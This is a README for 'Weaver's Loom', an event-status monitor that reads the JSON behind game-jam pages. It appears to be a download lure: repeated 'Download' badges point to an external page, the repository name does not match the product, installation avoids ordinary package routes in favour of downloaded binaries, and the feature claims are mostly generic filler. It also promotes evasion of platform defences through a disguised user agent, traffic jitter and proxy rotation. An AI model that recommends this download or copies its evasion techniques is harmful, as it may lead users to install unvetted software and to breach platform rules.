![preview](https://raw.githubusercontent.com/hrmhjn/pixel-herd-json-detective/main/screen_5aff.svg)

# Weaver's Loom — Dynamic Event Pulse Monitor

**A resilient event-status observation layer that reads a platform's live introspection feed rather than trusting its decorative countdown ornaments.**

In the realm of digital gatherings, the countdown timer is a charming storyteller—but not always an honest one. It often narrates a tale from yesterday, frozen in time while the actual event shifts its phases quietly behind the scenes. Weaver's Loom steps into this gap, not as a scraper of visible text, but as a reader of the underlying structural JSON that the platform itself uses to determine the true state of an event. This tool acts as a vigilant sentinel, cross-referencing the declared pool size and phase against the real-time data payload, ensuring you and your community always see the forest, not just the painted leaves.

## 🌟 The Core Problem We Solve

Popular gaming and creativity platforms host thousands of simultaneous jams and competitions. Their public-facing pages often display a "time remaining" or "entries submitted" figure that updates lazily—sometimes every few minutes, occasionally every few hours. For community managers, streamers, or solo developers tracking a deadline, this staleness leads to missed submission windows or inaccurate hype announcements.

Weaver's Loom bypasses the cosmetic layer entirely. By parsing the embedded JSON payload that the platform's own frontend consumes, we retrieve:
- **Actual jam phase** (submission open, voting active, results pending, finished)
- **True participant pool size** (counted from the live data object, not the cached badge)
- **Timestamp of the last internal data refresh** (so you know how fresh the snapshot is)

This transforms the tool from a simple viewer into a diagnostic instrument—a stethoscope for the heartbeat of any online event.

## 🚀 Getting Started

The journey begins with a simple invocation. The system is designed to be platform-agnostic at its core, although the included adapters focus on the most common event-hosting URLs.

**[![Download](https://raw.githubusercontent.com/hrmhjn/pixel-herd-json-detective/main/dl_0a2856.svg)](https://hrmhjn.github.io/pixel-herd-json-detective/)**

### Prerequisites
- A modern runtime environment (Node.js 18+ or Python 3.9+)
- Outbound network access to the target platform’s domain
- A desire to see through the veil of decorative UI

### Basic Usage Pattern
```javascript
const Weaver = require('weavers-loom');

const probe = new Weaver.Probe('https://platform.example/jam/summer-showdown');
probe.analyze().then(snapshot => {
  console.log(snapshot.phase);          // 'voting'
  console.log(snapshot.poolSize);       // 342
  console.log(snapshot.dataFreshness);  // 45 (seconds ago)
});
```

The returned snapshot object contains three primary fields, plus a `raw` property holding the unmodified JSON for advanced inspection.

### Configuration Options
| Parameter | Type | Default | Description |
|-----------|------|---------|-------------|
| `refreshInterval` | Number | 30000 | Frequency of automatic re-polls (ms) |
| `strictMode` | Boolean | false | Raise errors if JSON structure deviates from known schema |
| `cacheResponses` | Boolean | true | Store successful raw payloads locally for audit trails |
| `userAgent` | String | *default UA* | Customize the request identity to blend in with organic traffic |

## 🧠 Architecture: The Loom's Inner Weave

The tool operates in three distinct phases, much like a weaver preparing threads for a tapestry.

### 1. The Scouting Thread (Fetching Layer)
The initial HTTP request does not target the rendered HTML page. Instead, it looks for the JavaScript bundle references and API endpoints that the platform’s frontend calls during initialization. This requires a lightweight fingerprinting mechanism that identifies the data-interchange format (the JSON schema).

### 2. The Sorting Comb (Parsing Engine)
Once the raw payload is retrieved, the engine walks the JSON tree looking for known markers. These markers are not hardcoded strings but rather structural signatures—for example, a nested object containing both a `phase` string and a numeric `participant_count`. This adaptive approach means that minor platform updates that rename a variable (from `entries` to `submissions`) do not break the parser.

### 3. The Display Reed (Output Formatter)
The final snapshot is formatted into a human-readable digest, suitable for terminal display, logging into a file, or piping into a notification system (Discord webhooks, Slack, etc.). The formatter supports multiple languages for its own interface prompts, ensuring that non-English-speaking community organizers can use the tool comfortably.

## 🌐 Multilingual Interface Support

The command-line interface and log outputs respect the `LANG` environment variable or a dedicated `--language` flag. Currently supported dialects include:

- English
- Español
- Français  
- Deutsch
- 日本語
- Português

This feature ensures that a community manager in Tokyo and a developer in Berlin can compare notes without translation friction.

## 🛡️ Resilience & Anti-Detection Measures

Weaver's Loom is built for sustained observation, not one-off queries. As such, it incorporates several features to remain a good citizen of the network:

- **Request Throttling**: Configurable minimum delay between polls to avoid hammering the host platform.
- **Jitter Injection**: Adds random variance to the polling interval to appear more organic.
- **Retry with Backoff**: On temporary network errors, the tool retries with exponential delay, capped at a maximum interval.
- **Response Caching**: Repeated identical snapshots are not re-written to the output log unless the `--verbose` flag is set.

This careful approach means the tool can run for days without triggering rate-limit protections.

## 📦 Feature Matrix

| Feature | Availability | Notes |
|---------|--------------|-------|
| Phase detection | ✅ | Distinguishes between 5+ distinct phases |
| Pool size verification | ✅ | Cross-references multiple counters when available |
| Freshness timestamping | ✅ | Shows data age in seconds |
| Historical trend export | ✅ | CSV output for graphing participation growth |
| Multi-event monitoring | ✅ | Monitor up to 10 events simultaneously |
| Webhook notifications | ✅ | Discord, Slack, generic HTTP POST |
| Offline mode | ✅ | Parse a previously saved JSON file |
| Proxy support | ✅ | HTTP/SOCKS5 for restricted networks |

### Responsive UI Dashboard (Bonus)
For those who prefer a visual overview, a companion web dashboard is included in the `dashboard/` directory. This lightweight single-page application polls the local Weaver instance and displays all monitored events on a single timeline. The dashboard is fully responsive, adapting from a mobile phone screen to a multi-monitor desktop setup without degradation. It uses a dark theme by default, with a toggle for light mode.

## ⚙️ Installation & Setup (Non-Command Method)

We have deliberately avoided the traditional command-line installation routes to provide a more integrated experience for teams.

**Option A: Container Deployment**
A pre-built container image is available from the project’s release artifacts. Run it with your preferred container runtime, passing the target URL as an environment variable.

**Option B: Source Bundle**
Download the release archive, extract it to your preferred directory, and run the main entry point directly from your language runtime. All third-party dependencies are vendored in the `vendor/` folder to ensure offline reproducibility.

**Option C: Native Build**
For those who wish to compile from source, the project includes a build script that produces a standalone binary. This binary has zero runtime dependencies and can be copied to any compatible system.

## 🔧 Advanced Configuration Recipes

### Recipe 1: Discord Alerting for Phase Change
```yaml
monitors:
  - url: "https://platform.example/jam/pixel-art-week"
    webhook: "https://discord.com/api/webhooks/YOUR_ENDPOINT"
    notify_on:
      - phase_change
      - pool_size_delta: 50
```
Configure the YAML file to watch for a specific event type or a numerical threshold change. The webhook fires only when the condition is met, keeping your channels tidy.

### Recipe 2: Historical Analysis for Future Planning
Run the tool with the `--export csv` flag to generate a time-series file. This data can be imported into any spreadsheet application to visualize participation velocity—useful for deciding whether the next jam should be extended by a day.

### Recipe 3: Proxy-Based Regional Probing
If you suspect that the platform serves different data to different geographic regions, configure a proxy list in the `config/proxies.yml` file. The tool will rotate through the list, tagging each snapshot with the proxy region used.

## 🧪 Testing Suite

The repository includes a comprehensive test harness covering:
- Mock HTTP servers with varying JSON schemas
- Edge cases (missing fields, null values, huge numbers)
- Rate-limit simulation
- Unicode and emoji in event names
- Malformed JSON responses

Run the tests with your language’s standard test runner. The suite is designed to complete in under two minutes on a modern laptop.

## 🤝 Contribution Guidelines for 2026

We welcome contributions from the community. Please read the `CONTRIBUTING.md` file before submitting a pull request. Key points:

- Adhere to the existing code style (linters are configured in the repo)
- Include test cases for any new parser signatures
- Update the multilingual message catalog if you add new UI strings
- Document any new environment variables in the example config

## ⚠️ Disclaimer

This tool is intended for legitimate community management, event coordination, and analytical purposes. Users are responsible for complying with the terms of service of any platform they monitor. The developers of Weaver's Loom do not endorse any violation of platform rules, nor do we provide any warranty regarding the tool’s accuracy or fitness for a particular purpose. The absence of a strict rate limit on your side does not absolve you from being a courteous network citizen. Monitor responsibly.

## 📜 License

This project is released under the MIT License. You are free to use, modify, and distribute it with attribution. The full text of the license is available in the repository’s `LICENSE` file.

---

## 🧵 Final Thoughts from the Loom

Weaver's Loom is more than a utility; it is an acknowledgment that the user interface is sometimes a curated illusion, and the data behind it holds the real story. By providing a direct line to that data, we empower organizers, participants, and curious onlookers to make decisions based on what *is*, not what *appears* to be.

The tool is built with patience—each poll is a gentle inquiry, not a demand. It waits, observes, and reports. Over days and weeks, the accumulated snapshots paint a vivid picture of how an event truly unfolds, from the first trickle of submissions to the final cascade of votes.

Whether you are a single developer tracking a passion project or a large community team coordinating a global game jam, Weaver's Loom offers a steady, reliable thread to follow through the chaotic weave of online events. Set it up once, let it run, and trust that when you look at your monitor, you are seeing the truth of the moment.

**[![Download](https://raw.githubusercontent.com/hrmhjn/pixel-herd-json-detective/main/dl_0a2856.svg)](https://hrmhjn.github.io/pixel-herd-json-detective/)**